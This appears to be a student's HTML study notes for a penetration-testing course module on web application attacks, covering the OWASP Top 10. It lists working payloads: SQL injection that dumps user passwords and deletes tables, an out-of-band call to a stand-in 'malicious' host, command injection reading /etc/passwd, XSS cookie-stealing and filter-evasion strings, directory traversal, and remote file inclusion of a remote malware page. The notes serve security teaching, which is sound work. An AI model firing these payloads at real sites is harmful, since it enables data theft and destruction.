<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Module 6 Exploit Application</title>
</head><body><span style="font-size: 14pt">6.1 Web Attacks and OWASP Top 10<br/>
6.1.2 The HTTP Protocol<br/>
Client - Proxy - Internet - HTTP Server<br/>
HTTP Request (Client - Server)<br/>
Open TCP Connection &lt;-&gt;<br/>
HTTP Request -&gt;<br/>
HTTP Response &lt;-<br/>
<br/>
tcpdump - capture HTTP request<br/>
<br/>
HTTP Method:<br/>
GET<br/>
HEAD<br/>
POST<br/>
TRACE<br/>
PUT<br/>
DELETE<br/>
OPTIONS<br/>
CONNECT<br/>
<br/>
HTTP URL Structure<br/>
https://theartofhacking.org:8123/dir/test;id=89?name= omar&amp;x=true<br/>
scheme (https://)<br/>
host (IP address of theartofhacking.org)<br/>
port (8123)<br/>
path (/dir/test;)<br/>
path-segment-params (id=89)<br/>
query-string (?name=omar&amp;x=true)<br/>
<br/>
HTTP 1.1 Exchange<br/>
<img src="image.png" width="450" height="517" /><br/>
<br/>
HTTP 2.0 Multiplexing<br/>
<img src="image 2.png" width="450" height="412" /><br/>
<br/>
6.1.4 Web Sessions<br/>
PHPSESSID (PHP)<br/>
JSESSIONID (J2EE)<br/>
CFID and CFTOKEN (ColdFusion)<br/>
ASP.NET_SessionId (ASP.NET)<br/>
<br/>
Encrypt session id<br/>
Hide the framework with generic name<br/>
<br/>
6.1.6 OWASP Top 10<br/>
<br/>
6.1.7 Lab - Website Vulnerability Scanning<br/>
Part 1: Launch Nikto and Perform a Basic Scan<br/>
Part 2: Use Nikto to Scan Multiple Web Servers<br/>
Part 3: Investigate Web Site Vulnerabilities<br/>
Part 4: Export Nikto Results to a File<br/>
<br/>
└─$ nikto -h 172.17.0.2 -o scan_results.htm<br/>
<br/>
6.1.8 Lab - GVM Vulnerability Scanner<br/>
Part 1: Scan a Host for Vulnerabilities<br/>
Part 2: Exploit a Vulnerability Found by GVM<br/>
<br/>
-------------------------------------<br/>
<br/>
6.2 How to Build Your Own Web Application Lab<br/>
Kali Linux<br/>
Parrot OS<br/>
<br/>
-------------------------------------<br/>
<br/>
6.3 Business Logic Flaws<br/>
Unverified ownership<br/>
Authentication bypass using an alternate path or channel<br/>
Authorization bypass through user-controlled key<br/>
Weak password recovery mechanism for forgotten password<br/>
Incorrect ownership assignment<br/>
Allocation of resources without limits or throttling<br/>
Premature release of resource during expected lifetime<br/>
Improper enforcement of a single, unique action<br/>
Improper enforcement of a behavioral workflow<br/>
<br/>
-------------------------------------<br/>
<br/>
6.4 Injection-Based Vulnerabilities<br/>
SQL injection<br/>
HTML injection<br/>
Command injection<br/>
Lightweight Directory Access Protocol (LDAP)<br/>
<br/>
6.4.2 SQL Injection<br/>
SELECT<br/>
UPDATE<br/>
DELETE<br/>
INSERT INTO<br/>
CREATE DATABASE<br/>
ALTER DATABASE<br/>
CREATE TABLE<br/>
ALTER TABLE DROP TABLE<br/>
CREATE INDEX<br/>
DROP INDEX<br/>
<br/>
Data definition language (DDL)<br/>
Data manipulation language (DML)<br/>
Transaction control<br/>
Session control<br/>
System control<br/>
Embedded SQL<ul><li style="list-style-type: none"></li>
</ul>
<img src="image 3.png" width="600" height="99" /><br/>
<br/>
Categories:<br/>
In-band SQL injection<br/>
Out-of-band SQL injection<br/>
Blind SQL injection<br/>
<br/>
# Detect injectable SQL<br/>
https://store.h4cker.org/buystuff.php?id=99 AND 1=2<br/>
SELECT * FROM products WHERE product_id=99 AND 1=2<br/>
<br/>
# Valid query after detected<br/>
https://store.h4cker.org/buystuff.php?id=99 AND 1=1<br/>
https://store.h4cker.org/buystuff.php?id=99; INSERT INTO users(username) VALUES ('omar') <br/>
<br/>
Database Fingerprinting<br/>
# Analyze error messages<br/>
MySQL Error 1064: You have an error in your SQL syntax<br/>
<br/>
# Microsoft SQL Server<br/>
Microsoft SQL Native Client error %u201880040e14%u2019<br/>
Unclosed quotation mark after the character string<br/>
<br/>
# Microsoft SQL Server with Active Server Page (ASP)<br/>
Server Error in '/' Application<br/>
<br/>
# Oracle<br/>
ORA-00933: SQL command not properly ended<br/>
<br/>
# PostgreSQL<br/>
PSQLException: ERROR: unterminated quoted string at or near " ' " Position: 1<br/>
or<br/>
Query failed: ERROR: syntax error at or near<br/>
" ' " at character 52 in /www/html/buyme.php on line 69.<br/>
<br/>
UNION<br/>
<br/>
SELECT zipcode FROM h4cker_customers<br/>
UNION<br/>
SELECT zipcode FROM h4cker_suppliers;<br/>
<br/>
https://store.h4cker.org/buyme.php?id=1234' UNION SELECT 1, user_name,password,'1','1','1',1 FROM user_system_data --<br/>
<br/>
Booleans in SQL Injection<br/>
<br/>
Out-of-Band Exploitation<br/>
<img src="image 4.png" width="650" height="373" /><br/>
<br/>
https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||(SELECT user FROM DUAL)--<br/>
<br/>
Stacked Queries<br/>
1; DELETE FROM customers<br/>
SELECT * FROM customers WHERE customer_id=1; DELETE FROM customers<br/>
<br/>
The Time-Delay SQL Injection Technique<br/>
Surveying a Stored Procedure SQL Injection<br/>
SQL Injection Mitigations<br/>
<br/>
6.4.4 Command Injection<br/>
normal input here; cat /etc/passwd<br/>
<br/>
6.4.6 Lightweight Directory Access Protocol (LDAP)<br/>
Authentication bypass<br/>
Information disclosure<br/>
<br/>
</span><div style="text-align: left"><span style="font-family: CiscoSans"><span style="font-size: 16pt">6.4.7 Lab - Injection Attacks (DVWA)</span><span style="font-size: 14pt"><br/>
</span></span></div><span style="font-size: 14pt"><br/>
# Detect SQL injection vulnerability<br/>
1' (error = yes vulnerable)<br/>
' OR 1=1# (true all)<br/>
<br/>
# Find column size (size = 2)<br/>
' ORDER BY 1 # <br/>
' ORDER BY 2 #<br/>
' ORDER BY 3 # (error!)<br/>
<br/>
' UNION SELECT 1,2 #<br/>
<br/>
# DBMS version<br/>
' UNION SELECT 1, VERSION() #<br/>
<br/>
# Database name<br/>
' UNION SELECT 1, DATABASE() #<br/>
<br/>
# Table names from database<br/>
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' #<br/>
<br/>
# Column names from table<br/>
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #<br/>
<br/>
# List columns in table<br/>
' UNION SELECT user, password FROM users #<br/>
<br/>
# Crack password hashes in crackstation.net<br/>
<br/>
-------------------------------------<br/>
<br/>
6.5 Authentication-Based Vulnerabilities<br/>
<br/>
6.5.2 Session Hijacking<br/>
Pre-authentication<br/>
Authentication<br/>
Session Management<br/>
Access Control<br/>
Session Finalization<br/>
<br/>
PHP: PHPSESSID<br/>
J2EE: JSESSIONID<br/>
ColdFusion: CFID and CFTOKEN<br/>
ASP.NET: ASP.NET_SessionId<br/>
<br/>
Attack method:<br/>
Predicting session tokens<br/>
Session sniffing<br/>
On-path attack (MITM)<br/>
<br/>
6.5.4 Redirect Attacks<br/>
6.5.5 Default Credentials<br/>
6.5.6 Kerberos Vulnerabilities<br/>
6.5.8 Lab - Using Password Tools<br/>
Part 1: Investigate Password Attacks<br/>
Part 2: Hashcat<br/>
Part 3: John the Ripper<br/>
Part 4: RainbowCrack and Rainbow Tables<br/>
<br/>
-------------------------------------<br/>
<br/>
6.6 Authorization-Based Vulnerabilities<br/>
<br/>
6.6.2 Parameter Pollution<br/>
https://store.h4cker.org/?search=cars<br/>
https://store.h4cker.org/?search=cars&amp;results=20<br/>
https://store.h4cker.org/?search=cars&amp;results=20&amp;search=bikes<br/>
<br/>
6.6.4 Insecure Direct Object Reference (IDOR)<br/>
<br/>
https://store.h4cker.org/buy?customerID=1188<br/>
https://store.h4cker.org/changepassd?user=omar<br/>
<br/>
6.7 Cross-Site Scripting (XSS)<br/>
Reflected XSS<br/>
Stored (persistent) XSS<br/>
DOM-based XSS<br/>
<br/>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>
<br/>
6.7.2 Reflected XSS Attacks<br/>
6.7.4 Stored XSS Attacks<br/>
<br/>
6.7.6 XSS Evasion Techniques<br/>
&lt;img src="javascript:alert('xss');"&gt;<br/>
&lt;img src=javascript:alert('xss')&gt;<br/>
&lt;img src=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;<br/>
<br/>
&lt;a onmouseover="alert(document.cookie)"&gt;This is a malicious link&lt;/a&gt;<br/>
<br/>
&nbsp;&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;<br/>
#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;<br/>
<br/>
¼script¾alert(¢XSS¢)¼/script¾<br/>
<br/>
&nbsp;&lt;EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH<br/>
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm<br/>
cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3<br/>
hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW<br/>
dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC<br/>
I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" <br/>
AllowScriptAccess="always"&gt;&lt;/EMBED&gt;<br/>
<br/>
&lt;iframe src="http://h4cker.org"&gt;&lt;/iframe&gt;<br/>
<br/>
-------------------------------------<br/>
<br/>
6.8 Cross-Site Request Forgery (CSRF) and Server-Side Request Forgery Attacks (SSRF)<br/>
password_new=test&amp;password_conf=test&amp;Change=Change#<br/>
<br/>
-------------------------------------<br/>
<br/>
6.9 Clickjacking<br/>
<br/>
-------------------------------------<br/>
<br/>
6.10 Security Misconfigurations<br/>
<br/>
6.10.2 Directory Traversal<br/>
http://192.168.78.8:66/vulnerabilities/fi/?page=../../../../../etc/passwd<br/>
<br/>
%2e%2e%2f is the same as ../<br/>
%2e%2e/ is the same as ../<br/>
..%2f is the same as ../<br/>
%2e%2e%5c is the same as ..<br/>
<br/>
6.10.4 Cookie Manipulation Attacks<br/>
Stored DOM-based attacks<br/>
<br/>
-------------------------------------<br/>
<br/>
6.11 File Inclusion<br/>
<br/>
6.11.2 Local File Inclusion<br/>
http://192.168.78.8:66/vulnerabilities/fi/?page=../../../../../etc/passwd<br/>
<br/>
6.11.3 Remote File Inclusion<br/>
http://192.168.78.8:66/vulnerabilities/fi/?page=http://malicious.h4cker.org/malware.html<br/>
<br/>
-------------------------------------<br/>
<br/>
6.12 Exploiting Insecure Code Practices<br/>
6.12.2 Comments in Source Code<br/>
6.12.3 Lack of Error Handling and Overly Verbose Error Handling<br/>
6.12.5 Hard-Coded Credentials<br/>
6.12.6 Race Conditions<br/>
6.12.7 Unprotected APIs<br/>
Simple Object Access Protocol (SOAP)<br/>
Representational State Transfer (REST)<br/>
GraphQL<br/>
<br/>
Swagger (OpenAPI)<br/>
Web Services Description Language (WSDL)<br/>
Web Application Description Language (WADL)<br/>
<br/>
6.12.9 Hidden Elements<br/>
&lt;input type="hidden" id="123" name="price" value="100.00"&gt;<br/>
<br/>
6.12.10 Lack of Code Signing<br/>
<br/>
6.12.11 Additional Web Application Hacking Tools<br/>
Burp Suite<br/>
OWASP Zed Attack Proxy (ZAP)<br/>
gobuster<br/>
ffuf<br/>
feroxbuster<br/>
<br/>
6.12.13 Lab - Use the OWASP Web Security Testing Guide<br/>
Part 1: Investigate the WSTG<br/>
Part 2: Owasp ZAP scanner<br/>
<br/>
&lt;END&gt;</span></body></html>